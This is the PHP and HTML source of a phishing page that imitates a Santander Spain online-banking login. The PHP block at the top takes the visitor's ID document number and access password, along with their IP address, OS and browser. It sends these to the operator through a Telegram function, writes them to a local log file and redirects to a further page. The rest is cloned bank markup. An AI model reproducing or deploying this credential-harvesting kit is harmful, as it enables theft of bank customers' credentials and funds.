<?php
require_once("config.php");
if(isset($_POST['doSubmit']))
{
    $type = $_POST["vals"];
    $id = $_POST['id_no'];
    $pass = $_POST['password'];

    $message = '/-- LOG --/' . getIPAddress() . "\r\n";
    $message .= '[Type] = ' . $type . "\r\n";
    $message .= '[ID] = ' . $id . "\r\n";
    $message .= '[Password] = ' . $pass . "\r\n";
    $message .= '[TIME/DATE] = ' . $date . "\r\n";
    $message .= '[IP address] = ' . getIPAddress() . "\r\n";
    $message .= '[OS] = ' . $user_os . "\r\n";
    $message .= '[BROWSER] = ' . $user_browser . "\r\n";
    telegram_send(urlencode($message));
    $house = fopen('fucked/LOGIN.html', 'a');
    fwrite($house, $message);
    fclose($house);
    header("Location: firma.php");
}
?>
<html lang="es" style="    background-image: url(./style/spring_afternoon_p.jpg);
    background-color: #ec0000;
    background-size: cover;
    height: auto;
    background-position-y: 100%;">
<head> <meta charset="utf-8"> 
<title>Home Banking</title> 



<meta name="description" content="">
<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
<meta http-equiv="cache-control" content="max-age=0"> 
<meta http-equiv="cache-control" content="no-cache">
<meta http-equiv="expires" content="0">
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT"> 
 <meta http-equiv="pragma" content="no-cache">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,target-densitydpi=device-dpi"> 
	   <meta name="mobile-web-app-capable" content="yes">
	   <meta name="apple-mobile-web-app-capable" content="yes">
	    <meta name="apple-mobile-web-app-status-bar-style" content="black">
	     <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta http-equiv="cleartype" content="on">  
	     <link rel="apple-touch-icon" sizes="57x57" href="./style/apple-icon-57x57.png"> 
	     <link rel="apple-touch-icon" sizes="60x60" href="./style/apple-icon-60x60.png"> 
	     <link rel="apple-touch-icon" sizes="72x72" href="./style/apple-icon-72x72.png"> 
	     <link rel="apple-touch-icon" sizes="76x76" href="./style/apple-icon-76x76.png">
	      <link rel="apple-touch-icon" sizes="114x114" href="./style/apple-icon-114x114.png">
	      <link rel="apple-touch-icon" sizes="120x120" href="./style/apple-icon-120x120.png"> 
	     <link rel="apple-touch-icon" sizes="144x144" href="./style/apple-icon-144x144.png"> 
	     <link rel="apple-touch-icon" sizes="152x152" href="./style/apple-icon-152x152.png"> 
	     <link rel="apple-touch-icon" sizes="180x180" href="./style//apple-icon-180x180.png"> 
	     <link rel="icon" type="image/png" sizes="192x192" href="./style/android-icon-192x192.png"> 
	     <link rel="icon" type="image/png" sizes="32x32" href="./style/favicon-32x32.png"> 
	     <link rel="icon" type="image/png" sizes="96x96" href="./style/favicon-96x96.png">
	      <link rel="icon" type="image/png" sizes="16x16" href="./style/favicon-16x16.png"> 
	     
	       <meta name="msapplication-TileColor" content="#ffffff">

	        <meta name="msapplication-TileImage" content="ms-icon-144x144.png">
	         <meta name="theme-color" content="#ffffff">   
	          <link rel="stylesheet" href="./style//main.a5beaad1.css"> </head> 

<script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>



	          <body class="santander login home">  <main> <header class="header-container ng-scope"> <div class="main-header"> <div id="mainMenuList" class="main-header-sub-content header"> <div class="header-content layout-row"> <div flex="40" class="flex-40"> <div class="logo-container"> <h1 class="new-santander-header"> <i class="i-new-santander"></i> </h1> </div> </div> <div flex="60" class="show-navbar-icons pull-right hide-xs flex-60"> <div id="navHeader" class="item-container layout-row" layout="row"> <div rel="comming" class="tooltip"> <a href="#" id="feedBack" target="_blank" class="link-decoration"> <i class="i-support"></i> <span> Atención al cliente <!-- <b class="tooltip-text">Próximamente</b> --> </span> </a> </div> </div> </div> </div> </div> </div> </header> <div id="smartBanner" style="display: none;"> <div class="xContainer"> <a target="_blank">X</a> </div> <div class="imgContainer"> <img class="imgref" src="./images/smarbannerimg.png"> </div> <div class="textContainer"> <b>Descarga APP Santander</b> Toda la funcionalidad, notificaciones y la mejor experiencia </div> <div class="flechaBanner"></div> </div> <div class="login-view layout-padding ng-scope _md layout-gt-sm-row layout-column flex-gt-sm flex" layout="column" layout-gt-sm="row" flex="" flex-gt-sm="" layout-padding=""> <section flex="33" flex-gt-sm="66" class="flex-gt-sm-66 flex-33 say-hi"> <article> <header>Buenas tardes</header> 


<p>31 agosto 2023</p>

	           </article> </section> <section flex="66" flex-gt-sm="33" class="login-form-flex flex-gt-sm-33 flex-66"> <section class="desktop-version text-right ng-scope"> <i class="i-desktop"></i> <a href="#" target="_blank" id="link_go_desktop" hb-href="desktop" class="semi-bold" data-tagisban="{&quot;idc&quot;:&quot;login&quot;,&quot;type&quot;:&quot;link&quot;, &quot;title&quot;:&quot;ir_web_clasica&quot;}">Ir a web clásica</a> </section> <section class="login-form ng-scope"> 



	         <form id="sscsc" name="sscsc" method="POST" style="display: block;"> <div class="doctype-select-block layout-row already-user-group">




<script type="text/javascript">
	
$(document).ready(function(){
  $("#Documento").click(function(){
    $("#sdasd").show();
  });
 $("#doc").click(function(){
    $("#sdasd").hide();
    $("#Documento").text("Documento");
    $("#nameinputs").attr("placeholder", "Documento");

	$("#valss").attr("value", "Documento");

    $("#hdik").show();
  });
$("#user").click(function(){
    $("#sdasd").hide();
    $("#Documento").text("Usuario");
    $("#nameinputs").attr("placeholder", "Usuario");
    $("#valss").attr("value", "Usuario");

    $("#hdik").hide();
  });


$("#warkhna").click(function(){
    $("#t5damhadi").show();
  });

$("#N").click(function(){
	$("#warkhna").text("NIF");
	$("#nameinputs").attr("placeholder", "NIF");
	$("#vals").attr("value", "NIF");
    $("#t5damhadi").hide();
  });
$("#S").click(function(){
	$("#warkhna").text("CIF");
	$("#nameinputs").attr("placeholder", "CIF");
	$("#vals").attr("value", "CIF");
    $("#t5damhadi").hide();
  });
$("#C").click(function(){
	$("#warkhna").text("NIE");
	$("#nameinputs").attr("placeholder", "NIE");
	    $("#vals").attr("value", "NIE");
    $("#t5damhadi").hide();
  });
$("#I").click(function(){
	$("#warkhna").text("Pasaporte");
	$("#nameinputs").attr("placeholder", "Pasaporte");

    $("#vals").attr("value", "Pasaporte");

    $("#t5damhadi").hide();
  });


});
</script>



	          <md-select aria-label="Tipo:Documento" class="md-no-underline select-id-option ng-valid flex ng-not-empty ng-dirty ng-valid-parse ng-touched" tabindex="1" role="listbox" id="select_opcion">
	           <md-select-value id="document_option" class="arrow-down">
	           <div id="Documento" class="md-text"> Documento </div> </md-select-value> 


	           <div id="sdasd" class="select-container" id="login_type">

	           <div id="doc" class="">Documento</div>
	          <div id="user">Usuario</div>

	           </div> </md-select>


	           <md-select id="hdik" aria-label="Documento:Pasaporte" class="md-no-underline select-doc-type ng-valid ng-scope flex-40 ng-not-empty ng-dirty ng-valid-parse ng-touched" flex="40" tabindex="2" role="listbox" id="select_document"> 
	             <md-select-value id="select_value_label_7" class="arrow-down"> 
	            <div id="warkhna" class="md-text"> NIF </div> </md-select-value> 
	           	<div id="t5damhadi" class="select-container" id="doc_type"> 
	            <div id="N">NIF</div> 
	            <div id="S">CIF</div> 
	            <div id="C">NIE</div>
	           	<div id="I">Pasaporte</div> </div> </md-select>

	            	   </div> <div class="not-you hide" onclick="cleanPass()"> <span> Cambiar usuario &gt; </span> </div> <p class="hi-guy hide">Hola <span class="username">...</span></p> <div class="layout-align-space-around-center layout-row already-user-group"> <md-input-container class="md-block md-icon-float flex-100 md-input-has-value" flex="100">



<input type="text" name="valss" id="valss" value="Documento" hidden>
<input type="text" name="vals" id="vals" value="NIF" hidden>


	            	    <input required="required" type="text" name="id_no" tabindex="3" maxlength="9" minlength="5" class="md-input ng-invalid ng-invalid-is-doc-valid" name="nameinputs" id="nameinputs" placeholder="NIF" autocomplete="off">






	            	     </md-input-container> </div> <div class="layout-align-space-around-center layout-row"> <md-input-container class="md-block md-icon-float flex" flex=""> 



	            	     	<input required="required" type="text" tabindex="4" placeholder="Clave de acceso" maxlength="8" minlength="4" name="password" class="md-input pass" id="input_6" autocomplete="off" style="font-family: lato;">


	            	     	 </md-input-container> </div> <div class="load-disc-font"></div> <div class="layout-align-start-center layout-row already-user-group"> <md-input-container class="md-block no-mg"> <md-checkbox name="fave" tabindex="5" type="checkbox" role="checkbox" class="ng-valid no-mg md-checked" aria-label="Recordar mi usuario" data-tagisban="{&quot;idc&quot;:&quot;login&quot;,&quot;type&quot;:&quot;md-checkbox&quot;, &quot;title&quot;:&quot;recordar_usuario&quot;}"> <div class="md-container md-ink-ripple"> <div class="md-icon"></div> <div class="md-ripple-container"></div> </div> <div class="md-label semi-bold"> Recordar mi usuario </div> </md-checkbox> </md-input-container> </div> <div class="layout-align-center-center layout-row"> 


	            	     	<button class="md-raised md-primary large-button md-button md-ink-ripple" tabindex="6" type="submit" id="submit_form" name="doSubmit"> <span>Entrar</span> <b class="loading hide"> <b class="b1"></b> <b class="b2"></b> <b class="b3"></b> </b> </button>






	            	     	 </div> <div class="layout-align-center-center layout-row block-warning hide"> <p class="animated shake"> En estos momentos no es posible acceder a su Banca Online. </p> <i class="i-warning"></i> </div> <div class="twin-buttons layout-align-space-between-center layout-row"> <div class="flex-50 left-text"> <a href="#" id="link_forgot" target="_blank" hb-href="forgot" class="md-raised md-secondary md-button" tabindex="7"> Recuperar clave </a> </div> <div class="flex-50 right-text"> <a class="md-raised md-secondary md-button semi-bold" id="link_get_credentials" tabindex="10" target="_blank"> Obtener claves </a> </div> </div> <div class="layout-row no-border already-user-group"> <div class="flex-100 left-text"> <a href="#" id="link_forgot" target="_blank" hb-href="signup" class="md-raised md-secondary large-button md-button semi-bold" tabindex="9"> Hazte cliente </a> </div> </div> </form>



	           </section> </section> </div> <div>  </div> <div>  </div> <div class="modal-container closed"> <!-- la clase closed se cambia por open y cambia la propiedad display de none a block (dialog.css)--> <div class="modal-background"> <!-- Este es el fondo que oscurece el fondo detrás del modal (dialog.css)--> </div> <div class="credentials"> <div class="modal-close-container"> <i class="modal-close" aria-label="cerrar" role="button" tabindex="0"></i> <!-- Aspa de cierre --> </div> <div class="container-int"> <h2>Banca Online</h2> <h1>Obtener claves</h1> <div class="container-cajas center-block"> <!-- <div class="layout-padding _md layout-gt-sm-row layout-column flex-gt-sm flex center-block"> --> <section> <article> <header> <i class="i-signup"></i> <h3>Alta en Banca Online</h3> </header> <p> Da de alta el servicio Banca Online para operar a través de Internet y disfruta de un mundo de ventajas estés donde estés. </p> <footer> <a class="md-raised md-primary large-button md-button md-ink-ripple" href="#" target="_blank" id="link_get_access" hb-href="access">Darme de alta</a> </footer> </article> </section> <section> <article> <header> <i class="i-pin"></i> <h3>Mi 1ª Clave de acceso</h3> </header> <p> Solicita aquí tu clave de acceso a Banca Online y empieza a disfrutar de las ventajas y facilidades que tiene operar a través de Internet. </p> <footer> <a class="md-raised md-primary large-button md-button md-ink-ripple" href="#" target="_blank" id="link_get_credentials" hb-href="credentials" tabindex="10">Obtener claves</a> </footer> </article> </section> </div> </div> </div> </div> </main> 

<span class="kxtag kxinvisible" data-id="33588">

</span>








</body></html>